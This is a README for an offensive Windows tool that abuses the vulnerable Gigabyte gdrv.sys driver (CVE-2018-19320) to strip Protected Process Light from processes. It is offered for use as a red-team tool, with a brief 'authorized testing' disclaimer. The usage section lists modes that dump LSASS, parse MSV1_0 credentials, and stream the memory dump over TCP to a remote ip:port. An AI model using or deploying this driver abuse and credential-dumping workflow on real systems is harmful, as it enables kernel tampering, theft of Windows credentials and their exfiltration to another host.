```
      .   .:: ...:......       .....:...  .:. .::          .
 .. ...  .:::......     ...........:::::::.::::  :
.      ..:.                            ....::::. ..
      ::::............                       .:::::
:     .:: .:::::..... ........               ........ ...
:      :::.::::::::::::::::....... ...                     .
.:    ...::::::::::::::::::::::::::... ... ....
 .: ..  :::::::...:......:::::::::::::::::..... .....
  ::     :::.     :  :.:  .    .: ::::::::::::::::::::::::..
   :     :.:     :: :::: .:.    : .:..::::::::::::::::::::::
  ..:      :     : . .:.   :  ..:  .: .:::::::::::::::::::::
    :. . .:..    :..  :    .::.::. .::.:: .:  .:::::::::::::
   .::.     :    :. ..::..       ...:.. .: :.    :.:::::::::
     .:    : .   :.:. .::..        :..:  . :     :  .:::::::.
    . :.   ..:   : .  : ::         .:::    ::    :.:....
  .  .:: .. ...  :.   .:::                 ::    :......
.... .:::   . :  .:                       :::    :  .:::::::
       ::    ..:. ::.        ..:::..     . ::   .::  :::::::
       ..:.. .  ...:::.     ::.....:    . ::   .:::  :::::::
        .:::        :: :.   :... ..:    .::: .:::::   ::::::
        :. ::.:.::. ::. ..  ..     .  .::.:.:::::::.  ::::::
       :: ......   ::::: .. . .... . .:. :::::..::::  ::::::
      .::    ..:   .:.::: :.  ..... .:. . ::.:.       ::::::
      ::::....  :   :::::: :::.....:::    :.:::::.....::::::
      ::::. ...:: ..:::. ..:.:::::::::    ::::::::::::::::::
      :::::.    :  ..:::.  :.      .::   ::. :::::::::::::::
     :::::::. :..:. :::::. :: ..   :::  ::::  :::::::::::::.
    .::::::::.:.   . :::::.:::     :::. ::...  :::::::::::.
   :::::::.::::: . .:::::::.:. .   .::: ::.: :  ::::::::.. .
 .:  :::: . :::::   ..:..:: :..  . :::: :     :  :::::::. .:
```

BYOVD tool that strips Protected Process Light from processes on windows

uses the gigabyte GIO driver (gdrv.sys) for kernel read/write through CVE-2018-19320

once PPL is gone you can do whatever you want with the process. mainly built for credential work but works on anything protected

## what it does

zeroes out `_EPROCESS.Protection` (the `PS_PROTECTION` struct) by resolving the EPROCESS address through `NtQuerySystemInformation` class 64 then writing through the drivers IOCTL memcpy primitive

## modes

- `megumin.exe <PID>` strip PPL only
- `megumin.exe <PID> --remote <ip:port>` build minidump in memory and stream it over TCP
- `megumin.exe <PID> --direct` parse MSV1_0 credentials straight from LSASS memory
- `megumin.exe <PID> --dump <path>` write minidump to a local file

## building

visual studio just open the sln and build

or with mingw

```
make
```

needs `x86_64-w64-mingw32-gcc`

## tested on

- windows server 2019 17763

## note

this is a red team tool built for authorized security testing. dont be stupid with it

EKUSUPUROOOOOSION!!
